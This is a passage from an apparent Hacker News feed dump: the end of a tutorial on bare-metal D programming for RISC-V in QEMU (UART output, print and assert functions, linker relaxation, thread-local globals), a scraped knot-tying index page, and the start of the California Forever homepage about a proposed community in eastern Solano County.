</span></span><span><span><span>alias</span> Uart <span>=</span> Ns16650a<span>!(</span><span>cast</span><span>(</span><span>ubyte</span><span>*)</span> <span>0x10000000</span><span>);</span>
</span></span></code></pre></div><p>Now in <code>kmain</code>, we can test the UART.</p>
<div><pre tabindex="0"><code data-lang="d"><span><span><span>module</span> <span>main</span><span>;</span>
</span></span><span><span>
</span></span><span><span><span>import</span> <span>uart</span><span>;</span>
</span></span><span><span>
</span></span><span><span><span>void</span> <span>kmain</span><span>()</span> <span>{</span>
</span></span><span><span>    Uart<span>.</span><span>tx</span><span>(</span><span>'h'</span><span>);</span>
</span></span><span><span>    Uart<span>.</span><span>tx</span><span>(</span><span>'i'</span><span>);</span>
</span></span><span><span>    Uart<span>.</span><span>tx</span><span>(</span><span>'\n'</span><span>);</span>
</span></span><span><span><span>}</span>
</span></span></code></pre></div><div><pre tabindex="0"><code data-lang="txt"><span><span>$ make prog.bin
</span></span><span><span>$ qemu-system-riscv64 -nographic -bios none -machine virt -kernel prog.bin
</span></span><span><span>hi
</span></span></code></pre></div><p>Press <code>Ctrl-A</code> <code>Ctrl-x</code> to quit QEMU (the program will enter an infinite loop
after returning from <code>kmain</code>).</p>
<h2 id="making-a-simple-print-function">Making a simple print function</h2>
<p>Now we can just wrap the <code>Uart.tx</code> function up with a <code>println</code> function and
we’ll have a bare-metal <code>Hello world!</code> in no time.</p>
<p>In <code>object.d</code>:</p>
<div><pre tabindex="0"><code data-lang="d"><span><span><span>import</span> <span>uart</span><span>;</span>
</span></span><span><span>
</span></span><span><span><span>void</span> <span>printElem</span><span>(</span><span>char</span> c<span>)</span> <span>{</span>
</span></span><span><span>    Uart<span>.</span><span>tx</span><span>(</span>c<span>);</span>
</span></span><span><span><span>}</span>
</span></span><span><span>
</span></span><span><span><span>void</span> <span>printElem</span><span>(</span><span>string</span> s<span>)</span> <span>{</span>
</span></span><span><span>    <span>foreach</span> <span>(</span>c<span>;</span> s<span>)</span> <span>{</span>
</span></span><span><span>        printElem<span>(</span>c<span>);</span>
</span></span><span><span>    <span>}</span>
</span></span><span><span><span>}</span>
</span></span><span><span>
</span></span><span><span><span>void</span> <span>print</span><span>(</span>Args<span>...)(</span>Args args<span>)</span> <span>{</span>
</span></span><span><span>    <span>foreach</span> <span>(</span>arg<span>;</span> args<span>)</span> <span>{</span>
</span></span><span><span>        printElem<span>(</span>arg<span>);</span>
</span></span><span><span>    <span>}</span>
</span></span><span><span><span>}</span>
</span></span><span><span>
</span></span><span><span><span>void</span> <span>println</span><span>(</span>Args<span>...)(</span>Args args<span>)</span> <span>{</span>
</span></span><span><span>    print<span>(</span>args<span>,</span> <span>'\n'</span><span>);</span>
</span></span><span><span><span>}</span>
</span></span></code></pre></div><p>And in <code>main.d</code>:</p>
<div><pre tabindex="0"><code data-lang="d"><span><span><span>void</span> <span>kmain</span><span>()</span> <span>{</span>
</span></span><span><span>    println<span>(</span><span>"Hello world!"</span><span>);</span>
</span></span><span><span><span>}</span>
</span></span></code></pre></div><div><pre tabindex="0"><code data-lang="txt"><span><span>$ make prog.bin
</span></span><span><span>$ qemu-system-riscv64 -nographic -bios none -machine virt -kernel prog.bin
</span></span><span><span>Hello world!
</span></span></code></pre></div><p>There you have it, (simulated) bare-metal hello world!</p>
<p>Some of the initialization we’ve done hasn’t been strictly necessary (we didn’t
end up using any variables in the BSS), but it should set you up properly for
writing more complex bare-metal programs. The next sections discuss some
further steps.</p>
<h2 id="bonus-content">Bonus content</h2>
<h2 id="adding-support-for-assertions-and-bounds-checking">Adding support for assertions and bounds-checking</h2>
<p>If you try to use a D assert expression, you might notice that the linking step fails:</p>
<div><pre tabindex="0"><code data-lang="txt"><span><span>riscv64-unknown-elf-ld: dstart.o: in function `_D6dstart5kmainFZv':
</span></span><span><span>dstart.d:(.text+0x3c): undefined reference to `__assert'
</span></span></code></pre></div><p>It is looking for an <code>__assert</code><sup id="fnref:8"><a href="#fn:8" role="doc-noteref">8</a></sup> function, so let’s create one in the <code>object.d</code> file:</p>
<div><pre tabindex="0"><code data-lang="d"><span><span>size_t <span>strlen</span><span>(</span><span>const</span><span>(</span><span>char</span><span>)*</span> s<span>)</span> <span>{</span>
</span></span><span><span>    size_t n<span>;</span>
</span></span><span><span>    <span>for</span> <span>(</span>n <span>=</span> <span>0</span><span>;</span> <span>*</span>s <span>!=</span> <span>'\0'</span><span>;</span> <span>++</span>s<span>)</span> <span>{</span>
</span></span><span><span>        <span>++</span>n<span>;</span>
</span></span><span><span>    <span>}</span>
</span></span><span><span>    <span>return</span> n<span>;</span>
</span></span><span><span><span>}</span>
</span></span><span><span>
</span></span><span><span>extern <span>(</span>C<span>)</span> noreturn <span>__assert</span><span>(</span><span>const</span><span>(</span><span>char</span><span>)*</span> msg<span>,</span> <span>const</span><span>(</span><span>char</span><span>)*</span> file<span>,</span> <span>int</span> line<span>)</span> <span>{</span>
</span></span><span><span>    <span>// convert a char pointer into a bounded string with the [0 .. length] syntax
</span></span></span><span><span><span></span>    <span>string</span> smsg <span>=</span> <span>cast</span><span>(</span><span>string</span><span>)</span> msg<span>[</span><span>0</span> <span>..</span> strlen<span>(</span>msg<span>)];</span>
</span></span><span><span>    <span>string</span> sfile <span>=</span> <span>cast</span><span>(</span><span>string</span><span>)</span> file<span>[</span><span>0</span> <span>..</span> strlen<span>(</span>file<span>)];</span>
</span></span><span><span>    println<span>(</span><span>"fatal error: "</span><span>,</span> sfile<span>,</span> <span>": "</span><span>,</span> smsg<span>);</span>
</span></span><span><span>    <span>while</span> <span>(</span><span>1</span><span>)</span> <span>{}</span>
</span></span><span><span><span>}</span>
</span></span></code></pre></div><p>Now you can use <code>assert</code> statements!</p>
<p>D also supports bounds-checking, and internally the compiler will also call
<code>__assert</code> when a bounds check fails. This means we also have working bounds
checks now.</p>
<p>Try this in <code>main.d</code>:</p>
<div><pre tabindex="0"><code data-lang="d"><span><span><span>void</span> <span>kmain</span><span>()</span> <span>{</span>
</span></span><span><span>    <span>char</span><span>[</span><span>10</span><span>]</span> array<span>;</span>
</span></span><span><span>    <span>int</span> x <span>=</span> <span>12</span><span>;</span>
</span></span><span><span>    println<span>(</span>array<span>[</span>x<span>]);</span>
</span></span><span><span><span>}</span>
</span></span></code></pre></div><p>Running it gives</p>
<div><pre tabindex="0"><code data-lang="txt"><span><span>fatal error: main.d: array index out of bounds
</span></span></code></pre></div><p>Bounds-checked arrays!</p>
<p>This code doesn’t print the line number because that requires converting an
<code>int</code> to a <code>string</code> – something left as an exercise to the reader.</p>
<h2 id="enabling-linker-relaxation">Enabling linker relaxation</h2>
<p><a href="https://www.sifive.com/blog/all-aboard-part-3-linker-relaxation-in-riscv-toolchain">Linker
relaxation</a>
is an optimization in the RISC-V toolchain that allows globals to be accessed
through the global pointer (stored in the <code>gp</code> register). This value is a
pointer to somewhere in the data section, which allows instructions to load
globals by directly offsetting from <code>gp</code>, instead of constructing the
address of the global from scratch (which may require multiple instructions on
RISC-V).</p>
<p>To enable linker relaxation we have to do three things:</p>
<ol>
<li>Modify the linkerscript so that it defines a symbol for the global pointer.</li>
<li>Load the <code>gp</code> register with this value in the <code>_start</code> function.</li>
<li>Enable linker relaxation in our compiler.</li>
</ol>
<p>To modify the linkerscript we just add the following at the beginning of the
<code>.rodata</code> section definition:</p>
<div><pre tabindex="0"><code data-lang="txt"><span><span>__global_pointer$ = . + 0x800;
</span></span></code></pre></div><p>This sets up the <code>__global_pointer$</code> symbol (a special symbol that the
linker assumes is stored in <code>gp</code>) to point <code>0x800</code> bytes into the data
segment (RISC-V instructions can load/store values offset up to <code>0x800</code> bytes
from the <code>gp</code> register in either direction in one instruction). This allows
offsets from <code>gp</code> to cover most/all of static data.</p>
<p>Next we add to <code>_start</code>:</p>
<div><pre tabindex="0"><code data-lang="txt"><span><span>.option push
</span></span><span><span>.option norelax
</span></span><span><span>la gp, __global_pointer$
</span></span><span><span>.option pop
</span></span></code></pre></div><p>We need to temporarily enable the <code>norelax</code> option, otherwise the assembler
will optimize this to <code>mv gp, gp</code>.</p>
<p>Finally, we can remove the <code>-mno-relax</code> flag from the <code>riscv64-unknown-elf-as</code>
invocation, and add <code>-mattr=+m,+a,+c,+relax</code> to the <code>ldc2</code> invocation to enable
linker relaxation in the compiler.</p>
<h2 id="removing-unused-functions">Removing unused functions</h2>
<p>If you take a look at the disassembly of the program (<code>make prog.list</code>), you
might notice there are definitions for functions that are never called. This is
because those functions have been inlined, but the definitions were not
removed. Functions/globals in D are always exported in the object file, even if
they are marked <code>private</code> (I’m not really sure why). Luckily modern linkers can
be pretty smart and it’s easy to have the linker remove these unused functions.
Pass <code>--function-sections</code> and <code>--data-sections</code> to LDC to have it put each
function/global in its own section (still within <code>.text</code>, <code>.data</code> etc.). Now if
you pass the <code>--gc-sections</code> flag to the linker, it will remove any
unreferenced sections (hence removing any unused functions/globals). With these
flags I got the final “hello world” binary down to 160 bytes.</p>
<p>This is a basic form of optimization performed by the linker. There are more
advanced forms of link-time optimization (LTO), which I won’t discuss in much
detail. If you pass <code>-flto=thin</code> or <code>-flto=full</code> to LDC, the object files that
it generates will be LLVM bitcode. Then you will need to invoke the linker with
the LLVMgold linker plugin (or use LLD) so that it can read these files. With
this method, the linker will apply full compiler optimizations across object
files.</p>
<!-- ## Why does the Makefile build one object file per source file? -->
<!--  -->
<!-- The Makefile for the project builds one object file per D source file. We could -->
<!-- also pass all the D files to the compiler at once, and generate one object file -->
<!-- from the result. That would probably produce a better-optimized binary (since -->
<!-- we aren't using LTO). However it is not as good for incremental rebuilds, since -->
<!-- we end up recompiling everything from scratch every time. -->
<h2 id="thread-local-storage-and-globals">Thread-local storage and globals</h2>
<p>Globals are thread-local by default in D. That means if you declare a global as
<code>int x;</code> then whenever you access <code>x</code>, the compiler will do so through the
system’s thread pointer (on RISC-V this is stored in the <code>tp</code> register). That
means if you use a thread-local variable, you had better make sure <code>tp</code>
points to a block of memory where <code>x</code> is located, and if you have multiple
threads each thread’s <code>tp</code> should point to a distinct thread-local block (each thread
will have its own private copy of <code>x</code>). I won’t explain in detail how to set that up here,
but briefly, you’ll need to initialize the <code>.tdata</code> and <code>.tbss</code> sections for each thread
in <code>dstart</code>, and load <code>tp</code> with a pointer to the current thread’s local <code>.tdata</code>.</p>
<p>To make a global shared across all threads, you need to mark it as <code>immutable</code>
or <code>shared</code>. A variable marked as <code>shared</code> imposes some limits, and basically
forces you to mark everything it touches as <code>shared</code>. You can still read/write
it without checks, but at least you should be able to easily know if you are
accessing a shared variable (and manually verify you have the appropriate
synchronization). In a future version of D it is likely that directly accessing
a shared variable will be disallowed, except through atomic intrinsics. If you
have a lock to protect the variable, then you will need to cast away the
<code>shared</code> qualifier manually, which isn’t perfect but forces the programmer to
acknowledge the possible unsafety of accessing the shared global. You can
always use the <code>__gshared</code> attribute as an escape hatch, which makes the global
shared but does not make any changes to the type (no limitations). A global
marked as <code>__gshared</code> is equivalent to a C global.</p>

<p>I hope this provided a simple introduction to D for bare-metal programming, and
that you might consider using D instead of C in some future project as a
result.  This post has only covered running in a simulated environment. In a
future post I’ll show how to write bare-metal code for the <a href="https://www.kickstarter.com/projects/starfive/visionfive-2">VisionFive
2</a><sup id="fnref:9"><a href="#fn:9" role="doc-noteref">9</a></sup>, a recently
released RISC-V SBC produced by StarFive. Stay tuned! (<a href="https://zyedidia.github.io/blog/posts/2-baremetal-visionfive">now
available</a>)</p>
<p>If you want to see a larger example, I am developing an operating system called
<a href="https://github.com/zyedidia/multiplix">Multiplix</a> in D. It has support for
RISC-V and AArch64, and targets the VisionFive, VisionFive 2, Raspberry Pi 3,
and Raspberry Pi 4 (and likely more boards in the future).
Check it out! It is currently heavily in-progress, but I plan to make a post
about it when it is further along.</p>
<p>The code from this post is available in my
<a href="https://github.com/zyedidia/blog-code">blog-code</a> repository.</p>


</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Animated Knots (470 pts)]]></title>
            <link>https://www.animatedknots.com/</link>
            <guid>37346115</guid>
            <pubDate>Fri, 01 Sep 2023 02:34:33 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.animatedknots.com/">https://www.animatedknots.com/</a>, See on <a href="https://news.ycombinator.com/item?id=37346115">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><main itemprop="mainContentOfPage"><div id="ult-easy-separator-163144942964f17c419b5cf" data-vc-row="wpb_row" data-ultimate-target="#ult-easy-separator-163144942964f17c419b5cf" data-responsive-json-new="{&quot;width&quot;:&quot;desktop:2560px;&quot;}"><p><img alt="null" src="https://www.animatedknots.com/wp-content/uploads/2019/03/Rope-Border-3000px-v2.png"><a href="#/" title="Marlow Ropes | Double Braid Lowering Lines"></a></p></div><div id="ult-easy-separator-108349804964f17c419c5e3" data-vc-row="wpb_row" data-ultimate-target="#ult-easy-separator-108349804964f17c419c5e3" data-responsive-json-new="{&quot;width&quot;:&quot;desktop:2560px;&quot;}"><p><img alt="null" src="https://www.animatedknots.com/wp-content/uploads/2019/03/Rope-Border-3000px-v2.png"><a href="#/" title="Marlow Ropes | Double Braid Lowering Lines"></a></p></div><div id="us_grid_1"><article data-id="662"><div> <p><img width="400" height="400" src="https://www.animatedknots.com/wp-content/uploads/2019/02/Overhand-Knot-S.jpg" alt="Overhand Knot - Single-Strand Stopper Knot" srcset="https://www.animatedknots.com/wp-content/uploads/2019/02/Overhand-Knot-S.jpg 400w, https://www.animatedknots.com/wp-content/uploads/2019/02/Overhand-Knot-S-150x150.jpg 150w, https://www.animatedknots.com/wp-content/uploads/2019/02/Overhand-Knot-S-300x300.jpg 300w, https://www.animatedknots.com/wp-content/uploads/2019/02/Overhand-Knot-S-350x350.jpg 350w, https://www.animatedknots.com/wp-content/uploads/2019/02/Overhand-Knot-S-120x120.jpg 120w, https://www.animatedknots.com/wp-content/uploads/2019/02/Overhand-Knot-S-75x75.jpg 75w, https://www.animatedknots.com/wp-content/uploads/2019/02/Overhand-Knot-S-160x160.jpg 160w, https://www.animatedknots.com/wp-content/uploads/2019/02/Overhand-Knot-S-90x90.jpg 90w" sizes="(max-width: 400px) 100vw, 400px"></p><div><p>The simplest of the Single-Strand Stopper Knots</p></div></div></article><article data-id="403"><div> <p><img width="400" height="400" src="https://www.animatedknots.com/wp-content/uploads/2019/03/Figure-8-Knot-S.jpg" alt="Figure 8 Knot - stopper knot" srcset="https://www.animatedknots.com/wp-content/uploads/2019/03/Figure-8-Knot-S.jpg 400w, https://www.animatedknots.com/wp-content/uploads/2019/03/Figure-8-Knot-S-150x150.jpg 150w, https://www.animatedknots.com/wp-content/uploads/2019/03/Figure-8-Knot-S-300x300.jpg 300w, https://www.animatedknots.com/wp-content/uploads/2019/03/Figure-8-Knot-S-350x350.jpg 350w, https://www.animatedknots.com/wp-content/uploads/2019/03/Figure-8-Knot-S-120x120.jpg 120w, https://www.animatedknots.com/wp-content/uploads/2019/03/Figure-8-Knot-S-75x75.jpg 75w, https://www.animatedknots.com/wp-content/uploads/2019/03/Figure-8-Knot-S-160x160.jpg 160w, https://www.animatedknots.com/wp-content/uploads/2019/03/Figure-8-Knot-S-90x90.jpg 90w" sizes="(max-width: 400px) 100vw, 400px"></p><div><p>Non-binding, quick and convenient stopper knot.</p></div></div></article><article data-id="644"><div> <p><img width="400" height="400" src="https://www.animatedknots.com/wp-content/uploads/2019/03/Half-Hitch-Knot-S.jpg" alt="Half Hitch - Basic Knots" srcset="https://www.animatedknots.com/wp-content/uploads/2019/03/Half-Hitch-Knot-S.jpg 400w, https://www.animatedknots.com/wp-content/uploads/2019/03/Half-Hitch-Knot-S-150x150.jpg 150w, https://www.animatedknots.com/wp-content/uploads/2019/03/Half-Hitch-Knot-S-300x300.jpg 300w, https://www.animatedknots.com/wp-content/uploads/2019/03/Half-Hitch-Knot-S-350x350.jpg 350w, https://www.animatedknots.com/wp-content/uploads/2019/03/Half-Hitch-Knot-S-120x120.jpg 120w, https://www.animatedknots.com/wp-content/uploads/2019/03/Half-Hitch-Knot-S-75x75.jpg 75w, https://www.animatedknots.com/wp-content/uploads/2019/03/Half-Hitch-Knot-S-160x160.jpg 160w, https://www.animatedknots.com/wp-content/uploads/2019/03/Half-Hitch-Knot-S-90x90.jpg 90w" sizes="(max-width: 400px) 100vw, 400px"></p><div><p>Used to tie rope around an object and back to itself.</p></div></div></article><article data-id="654"><div> <p><img width="400" height="400" src="https://www.animatedknots.com/wp-content/uploads/2019/03/Square-Knot-S.jpg" alt="Square Knot - Simple way to join two ropes" srcset="https://www.animatedknots.com/wp-content/uploads/2019/03/Square-Knot-S.jpg 400w, https://www.animatedknots.com/wp-content/uploads/2019/03/Square-Knot-S-150x150.jpg 150w, https://www.animatedknots.com/wp-content/uploads/2019/03/Square-Knot-S-300x300.jpg 300w, https://www.animatedknots.com/wp-content/uploads/2019/03/Square-Knot-S-350x350.jpg 350w, https://www.animatedknots.com/wp-content/uploads/2019/03/Square-Knot-S-120x120.jpg 120w, https://www.animatedknots.com/wp-content/uploads/2019/03/Square-Knot-S-75x75.jpg 75w, https://www.animatedknots.com/wp-content/uploads/2019/03/Square-Knot-S-160x160.jpg 160w, https://www.animatedknots.com/wp-content/uploads/2019/03/Square-Knot-S-90x90.jpg 90w" sizes="(max-width: 400px) 100vw, 400px"></p><div><p>Simple way to join two ropes made up of two Half Knots.</p></div></div></article><article data-id="668"><div> <p><img width="400" height="400" src="https://www.animatedknots.com/wp-content/uploads/2019/03/Slip-Knot-S.jpg" alt="Slip Knot - Knot loosens when tail end is pulled" srcset="https://www.animatedknots.com/wp-content/uploads/2019/03/Slip-Knot-S.jpg 400w, https://www.animatedknots.com/wp-content/uploads/2019/03/Slip-Knot-S-150x150.jpg 150w, https://www.animatedknots.com/wp-content/uploads/2019/03/Slip-Knot-S-300x300.jpg 300w, https://www.animatedknots.com/wp-content/uploads/2019/03/Slip-Knot-S-350x350.jpg 350w, https://www.animatedknots.com/wp-content/uploads/2019/03/Slip-Knot-S-120x120.jpg 120w, https://www.animatedknots.com/wp-content/uploads/2019/03/Slip-Knot-S-75x75.jpg 75w, https://www.animatedknots.com/wp-content/uploads/2019/03/Slip-Knot-S-160x160.jpg 160w, https://www.animatedknots.com/wp-content/uploads/2019/03/Slip-Knot-S-90x90.jpg 90w" sizes="(max-width: 400px) 100vw, 400px"></p><div><p>Simple loop in rope's end - loosens when tail end is pulled.</p></div></div></article><article data-id="652"><div> <p><img width="400" height="400" src="https://www.animatedknots.com/wp-content/uploads/2019/03/Sheet-Bend-Knot-S.jpg" alt="Sheet Bend Knot - Joins two ropes" srcset="https://www.animatedknots.com/wp-content/uploads/2019/03/Sheet-Bend-Knot-S.jpg 400w, https://www.animatedknots.com/wp-content/uploads/2019/03/Sheet-Bend-Knot-S-150x150.jpg 150w, https://www.animatedknots.com/wp-content/uploads/2019/03/Sheet-Bend-Knot-S-300x300.jpg 300w, https://www.animatedknots.com/wp-content/uploads/2019/03/Sheet-Bend-Knot-S-350x350.jpg 350w, https://www.animatedknots.com/wp-content/uploads/2019/03/Sheet-Bend-Knot-S-120x120.jpg 120w, https://www.animatedknots.com/wp-content/uploads/2019/03/Sheet-Bend-Knot-S-75x75.jpg 75w, https://www.animatedknots.com/wp-content/uploads/2019/03/Sheet-Bend-Knot-S-160x160.jpg 160w, https://www.animatedknots.com/wp-content/uploads/2019/03/Sheet-Bend-Knot-S-90x90.jpg 90w" sizes="(max-width: 400px) 100vw, 400px"></p><div><p>Joins two ropes of unequal, or similar, size</p></div></div></article></div><div id="us_grid_2"><article data-id="698"><div> <p><img width="400" height="400" src="https://www.animatedknots.com/wp-content/uploads/2019/02/Four-in-Hand-Necktie-Knot-S-1.jpg" alt="Four-in-Hand - Tie a Tie" srcset="https://www.animatedknots.com/wp-content/uploads/2019/02/Four-in-Hand-Necktie-Knot-S-1.jpg 400w, https://www.animatedknots.com/wp-content/uploads/2019/02/Four-in-Hand-Necktie-Knot-S-1-150x150.jpg 150w, https://www.animatedknots.com/wp-content/uploads/2019/02/Four-in-Hand-Necktie-Knot-S-1-300x300.jpg 300w, https://www.animatedknots.com/wp-content/uploads/2019/02/Four-in-Hand-Necktie-Knot-S-1-350x350.jpg 350w, https://www.animatedknots.com/wp-content/uploads/2019/02/Four-in-Hand-Necktie-Knot-S-1-120x120.jpg 120w, https://www.animatedknots.com/wp-content/uploads/2019/02/Four-in-Hand-Necktie-Knot-S-1-75x75.jpg 75w, https://www.animatedknots.com/wp-content/uploads/2019/02/Four-in-Hand-Necktie-Knot-S-1-160x160.jpg 160w, https://www.animatedknots.com/wp-content/uploads/2019/02/Four-in-Hand-Necktie-Knot-S-1-90x90.jpg 90w" sizes="(max-width: 400px) 100vw, 400px"></p><div><p>Quick,  convenient, but slightly asymmetrical, necktie.</p></div></div></article><article data-id="699"><div> <p><img width="400" height="400" src="https://www.animatedknots.com/wp-content/uploads/2019/02/Pratt-Necktie-Knot-S.jpg" alt="Pratt Tie Knot - Tie a Tie" srcset="https://www.animatedknots.com/wp-content/uploads/2019/02/Pratt-Necktie-Knot-S.jpg 400w, https://www.animatedknots.com/wp-content/uploads/2019/02/Pratt-Necktie-Knot-S-150x150.jpg 150w, https://www.animatedknots.com/wp-content/uploads/2019/02/Pratt-Necktie-Knot-S-300x300.jpg 300w, https://www.animatedknots.com/wp-content/uploads/2019/02/Pratt-Necktie-Knot-S-350x350.jpg 350w, https://www.animatedknots.com/wp-content/uploads/2019/02/Pratt-Necktie-Knot-S-120x120.jpg 120w, https://www.animatedknots.com/wp-content/uploads/2019/02/Pratt-Necktie-Knot-S-75x75.jpg 75w, https://www.animatedknots.com/wp-content/uploads/2019/02/Pratt-Necktie-Knot-S-160x160.jpg 160w, https://www.animatedknots.com/wp-content/uploads/2019/02/Pratt-Necktie-Knot-S-90x90.jpg 90w" sizes="(max-width: 400px) 100vw, 400px"></p><div><p>Produces a moderately large and symmetrical knot.</p></div></div></article><article data-id="700"><div> <p><img width="400" height="400" src="https://www.animatedknots.com/wp-content/uploads/2019/02/Half-Windsor-Necktie-Knot-S.jpg" alt="Half Windsor Tie Knot - Tie a Tie" srcset="https://www.animatedknots.com/wp-content/uploads/2019/02/Half-Windsor-Necktie-Knot-S.jpg 400w, https://www.animatedknots.com/wp-content/uploads/2019/02/Half-Windsor-Necktie-Knot-S-150x150.jpg 150w, https://www.animatedknots.com/wp-content/uploads/2019/02/Half-Windsor-Necktie-Knot-S-300x300.jpg 300w, https://www.animatedknots.com/wp-content/uploads/2019/02/Half-Windsor-Necktie-Knot-S-350x350.jpg 350w, https://www.animatedknots.com/wp-content/uploads/2019/02/Half-Windsor-Necktie-Knot-S-120x120.jpg 120w, https://www.animatedknots.com/wp-content/uploads/2019/02/Half-Windsor-Necktie-Knot-S-75x75.jpg 75w, https://www.animatedknots.com/wp-content/uploads/2019/02/Half-Windsor-Necktie-Knot-S-160x160.jpg 160w, https://www.animatedknots.com/wp-content/uploads/2019/02/Half-Windsor-Necktie-Knot-S-90x90.jpg 90w, https://www.animatedknots.com/wp-content/uploads/2019/02/Half-Windsor-Necktie-Knot-S-60x60.jpg 60w" sizes="(max-width: 400px) 100vw, 400px"></p><div><p>Creates a symmetrical and moderately bulky knot.</p></div></div></article><article data-id="701"><div> <p><img width="400" height="400" src="https://www.animatedknots.com/wp-content/uploads/2019/02/Windsor-Necktie-Knot-S.jpg" alt="Windsor Tie Knot - Tie a Tie" srcset="https://www.animatedknots.com/wp-content/uploads/2019/02/Windsor-Necktie-Knot-S.jpg 400w, https://www.animatedknots.com/wp-content/uploads/2019/02/Windsor-Necktie-Knot-S-150x150.jpg 150w, https://www.animatedknots.com/wp-content/uploads/2019/02/Windsor-Necktie-Knot-S-300x300.jpg 300w, https://www.animatedknots.com/wp-content/uploads/2019/02/Windsor-Necktie-Knot-S-350x350.jpg 350w, https://www.animatedknots.com/wp-content/uploads/2019/02/Windsor-Necktie-Knot-S-120x120.jpg 120w, https://www.animatedknots.com/wp-content/uploads/2019/02/Windsor-Necktie-Knot-S-75x75.jpg 75w, https://www.animatedknots.com/wp-content/uploads/2019/02/Windsor-Necktie-Knot-S-160x160.jpg 160w, https://www.animatedknots.com/wp-content/uploads/2019/02/Windsor-Necktie-Knot-S-90x90.jpg 90w" sizes="(max-width: 400px) 100vw, 400px"></p><div><p>Produces a bulky, symmetrical, Necktie Knot.</p></div></div></article><article data-id="702"><div> <p><img width="400" height="400" src="https://www.animatedknots.com/wp-content/uploads/2019/02/Bow-Tie-Knot-S.jpg" alt="Bow Tie - Tie a Tie" srcset="https://www.animatedknots.com/wp-content/uploads/2019/02/Bow-Tie-Knot-S.jpg 400w, https://www.animatedknots.com/wp-content/uploads/2019/02/Bow-Tie-Knot-S-150x150.jpg 150w, https://www.animatedknots.com/wp-content/uploads/2019/02/Bow-Tie-Knot-S-300x300.jpg 300w, https://www.animatedknots.com/wp-content/uploads/2019/02/Bow-Tie-Knot-S-350x350.jpg 350w, https://www.animatedknots.com/wp-content/uploads/2019/02/Bow-Tie-Knot-S-120x120.jpg 120w, https://www.animatedknots.com/wp-content/uploads/2019/02/Bow-Tie-Knot-S-75x75.jpg 75w, https://www.animatedknots.com/wp-content/uploads/2019/02/Bow-Tie-Knot-S-160x160.jpg 160w, https://www.animatedknots.com/wp-content/uploads/2019/02/Bow-Tie-Knot-S-90x90.jpg 90w" sizes="(max-width: 400px) 100vw, 400px"></p><div><p>Provides the wearer with formality and elegance.</p></div></div></article></div><div><p><h2>What type of knot do you need?</h2></p></div></main></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[California Forever (122 pts)]]></title>
            <link>https://californiaforever.com/</link>
            <guid>37346024</guid>
            <pubDate>Fri, 01 Sep 2023 02:17:57 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://californiaforever.com/">https://californiaforever.com/</a>, See on <a href="https://news.ycombinator.com/item?id=37346024">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
      <section>
        <!-- NOTE TITLE HAS A CUSTOM WIDTH -->
        <h2 id="page-title">
          Starting a<br> conversation about eastern Solano
          County
        </h2>
        <h2>
          A chance for a new community, good paying local jobs,<br> solar<br> farms, and open space
        </h2>
        <div>
          <picture>
  <source media="(max-width:767px)" sizes="(max-width: 1366px) 100vw, 1366px" srcset="https://californiaforever.com/_astro/01-image_mobile.0e4c9092_2oXKtO.webp 1x, https://californiaforever.com/_astro/01-image_mobile@2x.370420e1_Z1uKheq.webp 2x, https://californiaforever.com/_astro/01-image_mobile@2x.370420e1_Z1uKheq.webp 3x">
  <img src="https://californiaforever.com/_astro/01-image@2x.69fd3547_ovv4I.webp" sizes="(max-width: 5120px) 40vw, 2048px" srcset="https://californiaforever.com/_astro/01-image.7268ea09_1vnXI3.webp 1x, https://californiaforever.com/_astro/01-image@2x.69fd3547_ovv4I.webp 2x, https://californiaforever.com/_astro/01-image@2x.69fd3547_ovv4I.webp 3x" alt="Illustration of a built-up area surrounded by a green landscape" width="860" height="484" loading="lazy" decoding="async">
</picture>
        </div>

        <div><p>
          Solano County sits at the crossroads of Northern California. Nestled
          between Sacramento, the Delta, San Francisco, and Napa Valley, Solano
          perfectly captures the diversity of California’s landscapes and its
          people. It is the home of agriculture and green energy industries that
          sustainably feed and power our state, strong middle-class communities,
          and our nation’s busiest Air Force base. Eastern Solano County is also
          an area ready for a new community. We’re excited to tell our story.
          </p><p>
          
           California Forever is the parent company of Flannery Associates. Over
          the last few years, Flannery has purchased over 50,000 acres in Solano
          County. To date, our company has been quiet about our activities. This
          has, understandably, created interest, concern, and speculation. Now
          that we're no longer limited by confidentiality, we are eager to begin
          a conversation about the future of Solano County – a conversation with
          all of you. Like much of our state, Solano County faces many
          challenges - but also presents countless opportunities. Over the past
          few years, we have completed surveys and interviews with about 2,000
          residents of Solano County and your voices were clear. Residents want
          more opportunities to buy homes in safe, walkable communities. Good
          paying local jobs, so they can both live and work in the county.
          Better funding to improve schools, promote public safety, and reduce
          homelessness, as well as resources to invest in infrastructure for
          transportation, water, and wildfire protection.
        </p></div>
        <p>
          Last month, 81% of Solano parents we surveyed said that their kids
          won’t be able to find a future in their own neighborhood when they
          grow up.
        </p>
        <p>
          These challenges often have separate, unrelated causes. But they could
          share a common solution. Instead of watching our kids leave, we have
          the opportunity to build a new community that attracts new employers,
          creates good paying local jobs, builds homes in walkable
          neighborhoods, leads in environment stewardship, and fuels a growing
          tax base to serve the county at large. And, Solano has the right
          location for a project like this in the eastern part of the county.
        </p>

        <picture>
  <source media="(max-width:767px)" sizes="(max-width: 1366px) 100vw, 1366px" srcset="https://californiaforever.com/_astro/image-barren-mobile.efd1202a_ZibXF1.webp 1x, https://californiaforever.com/_astro/image-barren-mobile@2x.cdd0bb71_Z1FQDCC.webp 2x, https://californiaforever.com/_astro/image-barren-mobile@2x.cdd0bb71_Z1FQDCC.webp 3x" width="608">
  <img src="https://californiaforever.com/_astro/image-barren@2x.a8375819_2339M1.webp" sizes="(max-width: 5120px) 40vw, 2048px" srcset="https://californiaforever.com/_astro/image-barren.c7bfb94e_Z1OpEVV.webp 1x, https://californiaforever.com/_astro/image-barren@2x.a8375819_2339M1.webp 2x, https://californiaforever.com/_astro/image-barren@2x.a8375819_2339M1.webp 3x" alt="An unused landscape in Eastern Solano" width="640" height="530" loading="lazy" decoding="async">
</picture>
        <p>
          The area today.
        </p>
        <p>
          This is not just our idea. In the past, when preparing long-range
          plans for the Bay Area, the Association of Bay Area Governments
          ("Regional Plan 1970-1990") and the U.S. Department of Commerce
          ("Future Development of the San Francisco Bay Area, 1960-2020") both
          concluded that to keep our region affordable, prosperous, and
          balanced, new industries and communities could be built in eastern
          Solano. The area had low fire risk, access to water, and was
          strategically located in the middle of the larger Northern California
          region. All that remains true today.
        </p>
        
        <h2>
